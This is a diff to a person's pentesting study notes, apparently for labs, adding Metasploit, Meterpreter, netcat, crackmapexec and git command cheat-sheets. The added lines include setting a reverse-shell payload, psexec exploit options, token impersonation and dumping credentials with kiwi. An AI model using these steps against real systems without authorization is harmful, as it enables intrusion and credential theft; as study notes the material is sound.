@@ -67,10 +67,57 @@ msfconsole (metasploit)
 
 similar to nmap but a terminal application in itself
 
-show -h [list of all available tools]
+show -all [list of all available tools]
+search <tool> [search a specific tool]
 
 use [to select and specific tool]
 
+exploit [perform the exploit]
+
+for payloads
+
+use <exploit tool>
+set payload <payload> e.g: linux/x86/shell_reverse_tcp
+
+*******************************************************
+IMPORTANT METASPLOIT TOOLS AND EXPLOITS
+
+use keyword 'set' to choose a specific option
+
+exploit windows/smb/psexec
+required:
+    rhosts < target ip>
+    smbdomain <domain>
+    smbpass <password>
+    smbuser <username>
+    target <select target from 0 to 4>
+
+posr/mult/recon/local_exploit suggester
+    required:
+        session <an open session>
+
+    possible exploits
+
+
+METERPRETER
+
+use 'background' to put meterpreter in the background
+sessions [see all availabe sessions]
+sessions <i> [return to the i meterpreter session]
+
+getuid [get current user]
+sysinfo [get current system info]
+
+load incognito
+list_tokens -u [list tokens only by userss]
+list_tokens -g [list tokenes by group]
+
+impersonate_token <user_token>¨
+
+load kiwi
+creds_all [obtains all credentials]
+
+*******************************************************
 ----------------------------------------------------
 gobuster
 
@@ -106,3 +153,31 @@ more <file> [(inside the smb cliente) to cat files]
 ---------------------------------------------------------
 
 hosts names are found in /etc/hosts
+
+---------------------------------------------------------
+git
+
+git config --global user.name "user name"
+git config --global user.email "email@domain.com"
+
+set up an existing repo to a another location
+
+git remote add <repo_name> <repo_url>
+git pull <repo_name> main
+
+----------------------------------------------------------
+netcat (nc)
+
+nc <ip> <port> [to establish connection]
+nc -lvp <port> [listen the desired port]
+
+----------------------------------------------------------
+crackmapexec
+
+looks for smb logins using the specified target
+
+smb [search smb]
+ip [target]
+-u [username]
+-p ['actual password']
+-d [domain]
